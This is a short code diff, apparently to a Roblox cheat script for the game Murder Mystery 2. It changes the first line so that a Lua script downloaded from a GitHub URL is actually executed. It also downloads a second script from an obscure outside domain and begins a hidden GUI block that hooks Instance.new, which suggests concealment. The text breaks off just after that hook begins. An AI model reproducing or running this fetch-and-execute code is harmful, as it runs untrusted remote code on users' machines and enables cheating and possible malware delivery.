@@ -1,5 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ItsJiDy/Personal-Script/refs/heads/main/mm2%20halloween.lua")
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ItsJiDy/Personal-Script/refs/heads/main/mm2%20halloween.lua"))()
 local secondScript = game:HttpGet("https://egorikusa.space/6d54dbef7d68fb87c36a6ff4.lua", true)
 local hiddenGuiScript = [[
 local oldInstanceNew = Instance.new
